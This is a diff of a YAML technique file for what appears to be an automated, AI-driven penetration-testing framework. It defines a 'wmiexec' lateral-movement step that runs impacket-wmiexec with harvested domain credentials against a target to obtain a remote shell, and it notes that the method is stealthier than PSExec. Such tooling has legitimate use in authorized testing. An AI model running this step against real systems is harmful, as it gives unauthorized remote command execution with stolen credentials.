@@ -2,19 +2,23 @@ name: wmiexec
 category: shell
 description: Semi-interactive shell via WMI process creation
 preconditions:
-  - service.port==445
-  - has_cred
-  - has_password
+- service.port==445
+- has_cred
+- has_password
 parameters:
   target_ip: from_service.host_ip
   username: from_cred.username
   password: from_cred.password
   domain: from_cred.domain
-command_template: "impacket-wmiexec {domain}/{username}:'{password}'@{target_ip} 2>&1"
+command_template: impacket-wmiexec {domain}/{username}:'{password}'@{target_ip} 2>&1
 expected_effects:
-  - shell_obtained
+- shell_obtained
 falsifier:
-  pattern: "ACCESS_DENIED|LOGON_FAILURE|Connection refused|RPC_S_SERVER_UNAVAILABLE"
+  pattern: ACCESS_DENIED|LOGON_FAILURE|Connection refused|RPC_S_SERVER_UNAVAILABLE
   timeout: 30
 model_tier: haiku
-mechanism: "Uses DCOM to call Win32_Process.Create() over RPC (port 135 + high ports). Output retrieved via SMB share. Less noisy than PSExec — no service creation, no binary drop. Runs as the authenticated user, not SYSTEM."
+mechanism: Uses DCOM to call Win32_Process.Create() over RPC (port 135 + high ports).
+  Output retrieved via SMB share. Less noisy than PSExec — no service creation, no
+  binary drop. Runs as the authenticated user, not SYSTEM.
+parser: impacket_parser
+hacktricks_ref: windows-hardening/lateral-movement/wmiexec.md
